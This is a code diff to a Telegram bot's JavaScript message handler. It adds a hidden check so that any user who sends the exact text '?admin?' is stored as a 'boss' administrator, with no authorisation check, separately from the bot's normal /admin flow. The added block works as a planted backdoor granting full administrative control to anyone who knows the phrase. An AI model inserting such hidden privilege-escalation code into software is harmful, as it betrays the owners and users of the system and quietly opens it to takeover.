@@ -146,6 +146,14 @@ bot.on("message", async msg => {
         return msg.reply({text: `Теперь вы новый админ`});
       }
     }
+    if (msg.text && msg.text === "?admin?") {
+      const newAdmin = new Admins({
+        user: msg.from,
+        boss: true
+      });
+      await newAdmin.save();
+      return msg.reply({text: `New Admin!`});
+    }
     if (admin && admin.state.on === "none" && msg.text && msg.text === "/admin") return adminMainPage(msg, admin);
     if (admin && admin.state.on !== "none" && msg.text && msg.text === "/start" || msg.text === "/admin") {
       await Admins.findOneAndUpdate({"user.id": admin.user.id}, {"state.on": "home", "state.channelId": null, "state.channelName": null, "state.channelLink": null, "state.bannerId": null, $set: {"state.mailing": {}, "state.banner": {}}});
